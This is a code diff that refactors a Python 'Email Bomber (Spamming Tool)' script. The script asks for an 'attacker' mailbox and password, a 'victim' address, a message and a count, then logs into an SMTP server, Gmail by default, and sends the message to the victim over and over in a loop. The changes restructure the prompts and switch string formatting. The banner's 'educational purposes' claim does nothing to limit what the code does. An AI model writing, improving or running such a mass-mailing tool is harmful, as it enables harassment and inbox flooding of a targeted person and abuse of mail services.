@@ -10,34 +10,32 @@ from getpass import getpass
 import sys
 from time import sleep
 
-print('                                                                    ')
-print('                                                                    ')
-print('            #################################################       ')
-print('            #                                               #       ')
-print('            #        Email Bomber ( Spamming Tool )         #       ')
-print('            #                                               #       ')
-print('            #                  Version 3.0                  #       ')
-print('            #                                               #       ')
-print('            #           Modified by : Mohin Paramasivam     #       ')
-print('            #                                               #       ')
-print('            #       Only for Educational Purposes !!        #       ')
-print('            #                                               #       ')
-print('            #################################################       ')
-print('\n\n')
+print('''                                                                    
+                                                                    
+            #################################################       
+            #                                               #       
+            #        Email Bomber ( Spamming Tool )         #       
+            #                                               #       
+            #                  Version 3.0                  #       
+            #                                               #       
+            #           Modified by : Mohin Paramasivam     #       
+            #                                               #       
+            #       Only for Educational Purposes !!        #       
+            #                                               #       
+            #################################################\n\n''')      
+try:
+    user , email , passwd = input('Anonymous name: ') , input('\nAttacker Email Address: ') , getpass('\nAttacker Email Password: ')\
+    to , total , body = input('\nVictim Email Address: ') , int(input('\nNumber of emails: ')) , input('\nMessage: ')
+    Cserver = input('\nCustom smtp server (leave blank to use gmail): ')
+except:
+    pass
 
-user = input('Anonymous name: ')
-email = input('\nAttacker Email Address: ')
-passwd = getpass('\nAttacker Email Password: ')
-to = input('\nVictim Email Address: ')
-total = input('\nNumber of emails: ')
-body = input('\nMessage: ')
-Cserver = input('\nCustom smtp server (leave blank to use gmail): ')
 
-if not Cserver == '':
+if Cserver != '':
     defaultconf = False
     smtp_server = Cserver
     Cport = input('Custom smtp port (leave blank to use defaul port): ')
-    if not Cport == '':
+    if Cport != '':
         port = int(Cport)
     else:
         port = 587
@@ -54,13 +52,13 @@ try:
     server.login(email, passwd)
     for i in range(1, int(total) + 1):
         subject = urandom(9)
-        msg = 'From: ' + user + '\nMessage: ' + '\n' + body
+        msg = f'From:{user}\nMessage:\n{body}'
         server.sendmail(email, to, msg)
-        print("\rE-mails sent: %i" % i)
+        print(f"E-mails sent: {i}")
         sleep(1)
         sys.stdout.flush()
     server.quit()
-    print('\n Done !!!')
+    print('Done !!!')
     sys.exit()
 except KeyboardInterrupt:
     print('[-] Canceled')
@@ -71,3 +69,5 @@ except smtplib.SMTPAuthenticationError:
 except smtplib.SMTPConnectError:
     print('\n[!] Failed to connect with the SMTP server')
     sys.exit()
+else:
+    pass
